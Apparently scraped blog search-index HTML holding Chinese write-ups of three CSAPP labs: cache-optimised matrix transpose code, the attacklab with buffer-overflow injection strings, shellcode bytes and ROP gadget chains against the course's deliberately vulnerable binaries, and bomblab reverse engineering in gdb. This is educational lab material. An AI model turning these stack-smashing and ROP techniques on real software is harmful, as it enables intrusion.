&lt;p&gt;这一部分需要我们实现矩阵的转置，要求尽可能地利用cache，即减少miss，总共有三道题。&lt;/p&gt;
&lt;h3 id=&#34;3232&#34;&gt;32*32&lt;/h3&gt;
&lt;p&gt;我们首先看一下示例的蛮力法&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_8db52d3dc29d6cd32b26b3a02bfc52b5.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
miss高达1183，远大于300的目标。&lt;br&gt;
我们知道的是cache 大小为 s=5,E=1,b=5,即32组_1行_32字节，共256个int。&lt;br&gt;
所以我们需要对矩阵进行分块，我们在转置的过程中尽量让块小于cache大小，因为cache可以装256个int，所以块大小定为8*8。&lt;br&gt;
（这一步的代码没保存，就不贴了）&lt;br&gt;
结果是&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_cbdf4366e62a6c8c3e7a4e59490e533c.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
仍没达到要求。&lt;br&gt;
下一步我选择每次把每一行的8个数一次性读取，然后再一次性存到矩阵B中，这样可以进一步减少cache的替换，从而减少miss。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (M == 32)
    {
        int i, j, block_i;
        int t0, t1, t2, t3, t4, t5, t6, t7;
        for (i = 0; i &amp;lt; N; i += 8)
        {
            for (j = 0; j &amp;lt; M; j += 8)
            {
                for (block_i = 0; block_i &amp;lt; 8; block_i++)
                {
                    t0 = A[i + block_i][j + 0];
                    t1 = A[i + block_i][j + 1];
                    t2 = A[i + block_i][j + 2];
                    t3 = A[i + block_i][j + 3];
                    t4 = A[i + block_i][j + 4];
                    t5 = A[i + block_i][j + 5];
                    t6 = A[i + block_i][j + 6];
                    t7 = A[i + block_i][j + 7];
                    B[j + 0][i + block_i] = t0;
                    B[j + 1][i + block_i] = t1;
                    B[j + 2][i + block_i] = t2;
                    B[j + 3][i + block_i] = t3;
                    B[j + 4][i + block_i] = t4;
                    B[j + 5][i + block_i] = t5;
                    B[j + 6][i + block_i] = t6;
                    B[j + 7][i + block_i] = t7;
                }
            }
        }
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果是&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_56c0dd079d3aca587e6d23ed1df3443d.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
终于通过了&lt;/p&gt;
&lt;h3 id=&#34;6464&#34;&gt;64*64&lt;/h3&gt;
&lt;p&gt;这是最难的一部分，因为整个cache只能存储数组的四行，所以如果按照8_8分块的话仍然有很高的冲突，然而这一题要求有十分严苛，只能1300，所以需要更精细的方法，先按照8_8分块，在块内在按照4*4划分，同时不追求一次到位，而要求最高的cache重复访问，详细解析可以参考&lt;a href=&#34;https://www.cnblogs.com/liqiuhao/p/8026100.html?utm_source=debugrun&amp;amp;utm_medium=referral&#34;&gt;这篇博客&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;代码：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;else if (N == 64)
    {
        for (int i = 0; i &amp;lt; N; i += 8)
        {
            for (int j = 0; j &amp;lt; M; j += 8)
            {
                for (int k = i; k &amp;lt; i + 4; ++k)
                {
                    /* 读取1 2，暂时放在左下角1 2 */
                    int temp_value0 = A[k][j];
                    int temp_value1 = A[k][j + 1];
                    int temp_value2 = A[k][j + 2];
                    int temp_value3 = A[k][j + 3];
                    int temp_value4 = A[k][j + 4];
                    int temp_value5 = A[k][j + 5];
                    int temp_value6 = A[k][j + 6];
                    int temp_value7 = A[k][j + 7];

                    B[j][k] = temp_value0;
                    B[j + 1][k] = temp_value1;
                    B[j + 2][k] = temp_value2;
                    B[j + 3][k] = temp_value3;
                    /* 逆序放置 */
                    B[j][k + 4] = temp_value7;
                    B[j + 1][k + 4] = temp_value6;
                    B[j + 2][k + 4] = temp_value5;
                    B[j + 3][k + 4] = temp_value4;
                }
                for (int l = 0; l &amp;lt; 4; ++l)
                {
                    /* 按列读取 */
                    int temp_value0 = A[i + 4][j + 3 - l];
                    int temp_value1 = A[i + 5][j + 3 - l];
                    int temp_value2 = A[i + 6][j + 3 - l];
                    int temp_value3 = A[i + 7][j + 3 - l];
                    int temp_value4 = A[i + 4][j + 4 + l];
                    int temp_value5 = A[i + 5][j + 4 + l];
                    int temp_value6 = A[i + 6][j + 4 + l];
                    int temp_value7 = A[i + 7][j + 4 + l];

                    /* 从下向上按行转换2到3 */
                    B[j + 4 + l][i] = B[j + 3 - l][i + 4];
                    B[j + 4 + l][i + 1] = B[j + 3 - l][i + 5];
                    B[j + 4 + l][i + 2] = B[j + 3 - l][i + 6];
                    B[j + 4 + l][i + 3] = B[j + 3 - l][i + 7];
                    /* 将3 4放到正确的位置 */
                    B[j + 3 - l][i + 4] = temp_value0;
                    B[j + 3 - l][i + 5] = temp_value1;
                    B[j + 3 - l][i + 6] = temp_value2;
                    B[j + 3 - l][i + 7] = temp_value3;
                    B[j + 4 + l][i + 4] = temp_value4;
                    B[j + 4 + l][i + 5] = temp_value5;
                    B[j + 4 + l][i + 6] = temp_value6;
                    B[j + 4 + l][i + 7] = temp_value7;
                }
            }
        }
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_ffb263a782f4a0423e7194043f170ae6.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
像这样进行专门的优化，确实可以极大地提高cache的利用率，从而提高程序的效率，但是其缺点也很明显，只能针对专门的矩阵进行优化，不具有普适性，就像我们即将看到的第三题。&lt;/p&gt;
&lt;h3 id=&#34;6167&#34;&gt;61*67&lt;/h3&gt;
&lt;p&gt;这一题由于矩阵没有什么特别的规律，所以不清楚在cache的映射情况，因此我们只能一步步地尝试分块的大小，最终发现大约在14*14时可以满足题目要求。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;else
    { //没有什么特征，只能试块大小，在14的时候misses为1996，通过了
        int block_size = 14;
        int i, j, bl_i, bl_j;
        for (i = 0; i &amp;lt; N; i += block_size)
            for (j = 0; j &amp;lt; M; j += block_size)
                for (bl_i = 0; bl_i &amp;lt; block_size &amp;amp;&amp;amp; bl_i + i &amp;lt; N; bl_i++)
                    for (bl_j = 0; bl_j &amp;lt; block_size &amp;amp;&amp;amp; bl_j + j &amp;lt; M; bl_j++)
                        B[j + bl_j][i + bl_i] = A[i + bl_i][j + bl_j];
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;满分合影&#34;&gt;满分合影&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/_b4661e2b2a55344639f67be2127d2350.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;完整代码&#34;&gt;完整代码&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://static.yulan.net.cn/image/csapp_cachelab_parta.c&#34;&gt;Part a&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://static.yulan.net.cn/image/csapp_cachelab_partb.c&#34;&gt;Part b&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
">CSAPP: cachelab</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/uscxh7_ainkg2/"" data-c="
          &lt;p&gt;这个实验要求在5个有不同安全漏洞的代码上进行攻击(一开始我还以为是要修复漏洞...)，总共有两种攻击方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Code Injection Attacks（缓冲区溢出攻击）&lt;/li&gt;
&lt;li&gt;Return-Oriented Programming（ROP攻击）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;从CSAPP网站下载下来解压后一共有五个文件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ctarget&lt;/code&gt;：一个容易遭受code injection攻击的可执行程序。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rtarget&lt;/code&gt;：一个容易遭受return-oriented programming攻击的可执行程序。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cookie.txt&lt;/code&gt;：一个8位的十六进制码，用于验证身份的唯一标识符。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;farm.c&lt;/code&gt;：目标“gadget farm”的源代码，用于产生return-oriented programming攻击。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hex2raw&lt;/code&gt;：一个生成攻击字符串的工具。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;实验之前一定要阅读&lt;a href=&#34;http://csapp.cs.cmu.edu/3e/attacklab.pdf&#34;&gt;指导手册&lt;/a&gt;，还有&lt;a href=&#34;http://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf&#34;&gt;GDB指南&lt;/a&gt;，对实验很有帮助。&lt;/p&gt;
&lt;h2 id=&#34;level1&#34;&gt;Level1&lt;/h2&gt;
&lt;p&gt;要求我们输入一段字符串，通过缓冲区溢出改变函数的返回地址，定向到 &lt;code&gt;touch1&lt;/code&gt; 函数&lt;br&gt;
首先看看 &lt;code&gt;test&lt;/code&gt; 函数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000401968 &amp;lt;test&amp;gt;:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 &amp;lt;getbuf&amp;gt;
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 &amp;lt;__printf_chk@plt&amp;gt;
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;没有什么特别之处&lt;br&gt;
我们再看下 &lt;code&gt;getbuf&lt;/code&gt; 函数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000004017a8 &amp;lt;getbuf&amp;gt;:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 &amp;lt;Gets&amp;gt;
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首先创建一个 40 个字节的缓冲区( &lt;code&gt;0x28=40&lt;/code&gt; )，然后通过Gets函数读取一个字符串到缓冲区。&lt;br&gt;
我们先来查看一下stack的状态：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/60b $rsp
0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到距离 &lt;code&gt;%rsp&lt;/code&gt; 的第41,42,43字节处有一个值 &lt;code&gt;761940&lt;/code&gt; ，猜测这是一个返回地址，Ctrl+F查找&lt;br&gt;
然而&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_0da3636d63a59ddbf940c5191d99cf0e.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
忽然想起小端序的问题，所以这个地址应该是 &lt;code&gt;401976&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_65725cc8a986fa6dbca8525ef2087c08.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
就是getbuf函数后一条指令的位置。&lt;br&gt;
所以我们只需要通过缓冲区溢出来改变这个指令地址即可。&lt;/p&gt;
&lt;h3 id=&#34;查看touch1的地址&#34;&gt;查看touch1的地址&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;00000000004017c0 &amp;lt;touch1&amp;gt;:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;构造我们的输入字符串&#34;&gt;构造我们的输入字符串&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 c0 17 40
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;前40位不重要&lt;/p&gt;
&lt;h3 id=&#34;通过hex2raw生成攻击字符串并执行&#34;&gt;通过hex2raw生成攻击字符串并执行&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./hex2raw &amp;lt; exploit1.txt &amp;gt; exploit1-raw.txt
ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit1-raw.txt 
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 C0 17 40
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过！！！&lt;/p&gt;
&lt;h2 id=&#34;level2&#34;&gt;Level2&lt;/h2&gt;
&lt;p&gt;这一关要我们从test跳转到另外一个函数 &lt;code&gt;touch2&lt;/code&gt; ，同时将我们自己的cookie作为参数传给 &lt;code&gt;touch2&lt;/code&gt; ，这个参数默认应该在%rdi中。&lt;br&gt;
这一关我们不仅要修改跳转地址，还要插入一段代码进去执行，我们可以把这段代码插在缓冲区之中，然后将返回地址修改为我们代码的地址，并我们的代码中加入ret指令，使他最后返回到 &lt;code&gt;touch2&lt;/code&gt; 的入口&lt;/p&gt;
&lt;h3 id=&#34;我们需要插入的代码&#34;&gt;我们需要插入的代码&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;mov $0x59b997fa,%rdi
pushq $0x4017ec
retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;很简单，只用将cookie保存到%rdi，然后重新指定 &lt;code&gt;touch2&lt;/code&gt; 的地址为返回地址即可&lt;br&gt;
使用gcc与objdump生成机器指令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ gcc -c asscode.s
ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ objdump -d asscode.o

asscode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;.text&amp;gt;:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;把指令插在缓冲区&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  78 dc 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;和level1一样，前面40个字节，后面是我们指定的返回地址，这里我们要将他指定为我们的代码插入的位置，也就是缓存区的起始地址。&lt;/p&gt;
&lt;h4 id=&#34;通过gdb查看rep的值&#34;&gt;通过gdb查看%rep的值&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;(gdb) print $rsp
$2 = (void *) 0x5561dc78
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以最后四个字节应该是 &lt;code&gt;78&lt;/code&gt; &lt;code&gt;dc&lt;/code&gt; &lt;code&gt;61&lt;/code&gt; &lt;code&gt;55&lt;/code&gt;&lt;br&gt;
最后和level1一样执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit2-raw.txt 
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;level3&#34;&gt;Level3&lt;/h2&gt;
&lt;p&gt;这一关和level2差不多，只是这次传的参数是一个指针，其实差不多，我们先把cookie存在栈里面，然后把地址传给%rdi即可。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_d13d42c5c8d72192ca39358968839d97.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
要注意函数hexmatch会使用栈上的空间，可能会覆盖我们的cookie&lt;br&gt;
&lt;strong&gt;不过没关系，&lt;/strong&gt;&lt;code&gt;**sub 0x28 %rsp**&lt;/code&gt;**  ，咱给自己造个栈**&lt;br&gt;
所以我们嵌入的代码应该是&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;movq $0x5561dc93,%rdi
sub $0x28,%rsp
pushq $0x4018fa
retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中第一步传给%rdi的地址应该是你存放cookie的地址，一定要数清楚，我们还要把cookie使用ascii码转义，并在末尾添加 &lt;code&gt;0x00&lt;/code&gt; 表示结束。&lt;/p&gt;
&lt;h4 id=&#34;生成机器码&#34;&gt;生成机器码&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ objdump -d asscode.o

asscode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;.text&amp;gt;:
   0:   48 c7 c7 93 dc 61 55    mov    $0x5561dc93,%rdi
   7:   48 83 ec 28             sub    $0x28,%rsp
   b:   68 fa 18 40 00          pushq  $0x4018fa
  10:   c3                      retq
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;最终写出入侵字串&#34;&gt;最终写出入侵字串&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;48 c7 c7 93 dc 61 55 48 83 ec 28 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00  78 dc 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;通过&#34;&gt;通过！！！&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit3-raw.txt 
Cookie: 0x59b997fa
Touch3!: You called touch3(&amp;quot;59b997fa&amp;quot;)
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 93 DC 61 55 48 83 EC 28 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 78 DC 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;rtarget&#34;&gt;rtarget&lt;/h2&gt;
&lt;h3 id=&#34;1&#34;&gt;1&lt;/h3&gt;
&lt;p&gt;rtarget要求我们进行ROP攻击，因为栈随机化，所以我们不能像之前一样指定地址，只能依靠代码中原有的gadget进行入侵。&lt;br&gt;
我的想法是先把cookie pop到某个寄存器中，然后再mov到rdi里面。&lt;br&gt;
参考了实验手册，检索了fram部分的代码后发现只有 &lt;code&gt;58&lt;/code&gt; 可以使用，也就是 &lt;code&gt;popq %rax&lt;/code&gt; &lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_74f7a02a83c7342936036627bf6b81df.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
然后寻找到一段 &lt;code&gt;movq %rax,%rdi&lt;/code&gt; 的指令。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_519414af020393b2e70643e9fd7c701e.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
这两个就是我们使用的gagget，地址分别是 &lt;code&gt;0x4019ab&lt;/code&gt; 和· &lt;code&gt;0x4019a2&lt;/code&gt;。&lt;br&gt;
将他们连续执行就会是如下情形：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;popq %rax
nop
ret
movq %rax,%rdi
ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们只用准备好pop出的数据和返回位置即可。&lt;br&gt;
这里要注意栈是向高字节收缩，所以我们需要把我们的插入片段放在40字节缓冲区后面。&lt;br&gt;
应该插入的代码如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ec 17 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;前40个字节没有实际意义，后面指定返回地址与准备pop出的数据&lt;/p&gt;
&lt;h3 id=&#34;2&#34;&gt;2&lt;/h3&gt;
&lt;p&gt;有些复杂，直接贴出来了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00            06 1a 40 00 00 00 00 00            /* mov %rsp,%rax */
a2 19 40 00 00 00 00 00            /* mov %rax,%rdi */

ab 19 40 00 00 00 00 00            /* pop %rax */
48 00 00 00 00 00 00 00

dd 19 40 00 00 00 00 00            /* mov %eax,%edx */
70 1a 40 00 00 00 00 00            /* mov %edx,%ecx */
13 1a 40 00 00 00 00 00            /* mov %ecx,%esi */
d6 19 40 00 00 00 00 00            /* lea (%rdi,%rsi,1),%rax */
a2 19 40 00 00 00 00 00            /* mov %rax,%rdi */
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61            /* cookie string */
00 00 00 00 00 00 00 00
&lt;/code&gt;&lt;/pre&gt;
">CSAPP: Attacklab</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/uscxh7_qulnpm/"" data-c="
          &lt;p&gt;Bomblab是CSAPP第三章的配套lab，主要任务是通过反汇编解谜。&lt;br&gt;
反汇编涉及到GDB的使用，可以参考&lt;a href=&#34;http://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf&#34;&gt;这里&lt;/a&gt;&lt;br&gt;
实验开始首先使用 &lt;code&gt;objdump -d bomb &amp;gt; bomb.txt&lt;/code&gt; 将反汇编文件重定向到txt方便查看。&lt;/p&gt;
&lt;h3 id=&#34;phase_1&#34;&gt;phase_1&lt;/h3&gt;
&lt;p&gt;在346行找到phase_1的代码段&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000400ee0 &amp;lt;phase_1&amp;gt;:
 400ee0:	48 83 ec 08          	sub    $0x8,%rsp
 400ee4:	be 00 24 40 00        mov    $0x402400,%esi
 400ee9:	e8 4a 04 00 00        callq  401338 &amp;lt;strings_not_equal&amp;gt;
 400eee:	85 c0                	test   %eax,%eax
 400ef0:	74 05                	je     400ef7 &amp;lt;phase_1+0x17&amp;gt;
 400ef2:	e8 43 05 00 00        callq  40143a &amp;lt;explode_bomb&amp;gt;
 400ef7:	48 83 c4 08          	add    $0x8,%rsp
 400efb:	c3                    retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看出是第二行传入一个地址给%esi， 然后调用函数 &lt;code&gt;callq 401338 &amp;lt;strings_not_equal&amp;gt;&lt;/code&gt; 调用函数，之后对返回值（在%eax中）进行测试，如果是0，则跳过 &lt;code&gt;callq 40143a &amp;lt;explode_bomb&amp;gt;&lt;/code&gt; 爆炸函数，所以我们的目标是让&lt;code&gt;strings_not_equal&lt;/code&gt;函数返回0，猜测我们需要输入的字符串应该与地址 &lt;code&gt;$0x402400&lt;/code&gt; 有关&lt;br&gt;
打开gdb调试&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gdb bomb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;设置断点&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) break phase_1
Breakpoint 1 at 0x400ee0
(gdb) break strings_not_equal
Breakpoint 2 at 0x401338
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看 &lt;code&gt;0x402400&lt;/code&gt; 处的值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-a&#34;&gt;(gdb) x/s 0x402400
0x402400:       &amp;quot;Border relations with Canada have never been better.&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;退出gdb重新运行bomb&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_e00a5fadb5b77735fb376642bdb85949.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
第一关通过！！！&lt;/p&gt;
&lt;h3 id=&#34;phase_2&#34;&gt;phase_2&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;0000000000400efc &amp;lt;phase_2&amp;gt;:
  400efc:	55                   	push   %rbp
  400efd:	53                   	push   %rbx
  400efe:	48 83 ec 28          	sub    $0x28,%rsp
  400f02:	48 89 e6             	mov    %rsp,%rsi
  400f05:	e8 52 05 00 00       	callq  40145c &amp;lt;read_six_numbers&amp;gt;
  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)
  400f0e:	74 20                	je     400f30 &amp;lt;phase_2+0x34&amp;gt;
  400f10:	e8 25 05 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400f15:	eb 19                	jmp    400f30 &amp;lt;phase_2+0x34&amp;gt;
  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax
  400f1a:	01 c0                	add    %eax,%eax
  400f1c:	39 03                	cmp    %eax,(%rbx)
  400f1e:	74 05                	je     400f25 &amp;lt;phase_2+0x29&amp;gt;
  400f20:	e8 15 05 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400f25:	48 83 c3 04          	add    $0x4,%rbx
  400f29:	48 39 eb             	cmp    %rbp,%rbx
  400f2c:	75 e9                	jne    400f17 &amp;lt;phase_2+0x1b&amp;gt;
  400f2e:	eb 0c                	jmp    400f3c &amp;lt;phase_2+0x40&amp;gt;
  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx
  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp
  400f3a:	eb db                	jmp    400f17 &amp;lt;phase_2+0x1b&amp;gt;
  400f3c:	48 83 c4 28          	add    $0x28,%rsp
  400f40:	5b                   	pop    %rbx
  400f41:	5d                   	pop    %rbp
  400f42:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第二关瞬间变长有木有&lt;/p&gt;
&lt;p&gt;首先查看一下 &lt;code&gt;read_six_numbers&lt;/code&gt; 的代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;000000000040145c &amp;lt;read_six_numbers&amp;gt;:
  40145c:	48 83 ec 18          	sub    $0x18,%rsp
  401460:	48 89 f2             	mov    %rsi,%rdx
  401463:	48 8d 4e 04          	lea    0x4(%rsi),%rcx
  401467:	48 8d 46 14          	lea    0x14(%rsi),%rax
  40146b:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  401470:	48 8d 46 10          	lea    0x10(%rsi),%rax
  401474:	48 89 04 24          	mov    %rax,(%rsp)
  401478:	4c 8d 4e 0c          	lea    0xc(%rsi),%r9
  40147c:	4c 8d 46 08          	lea    0x8(%rsi),%r8
  401480:	be c3 25 40 00       	mov    $0x4025c3,%esi
  401485:	b8 00 00 00 00       	mov    $0x0,%eax
  40148a:	e8 61 f7 ff ff       	callq  400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;
  40148f:	83 f8 05             	cmp    $0x5,%eax
  401492:	7f 05                	jg     401499 &amp;lt;read_six_numbers+0x3d&amp;gt;
  401494:	e8 a1 ff ff ff       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  401499:	48 83 c4 18          	add    $0x18,%rsp
  40149d:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然而并没有看懂...&lt;br&gt;
所以根据名字猜测可能是读入六个数，而且在调用之前为他创建了函数栈，所以读取的值可能在栈中&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  400efc:	55                   	push   %rbp
  400efd:	53                   	push   %rbx
  400efe:	48 83 ec 28          	sub    $0x28,%rsp
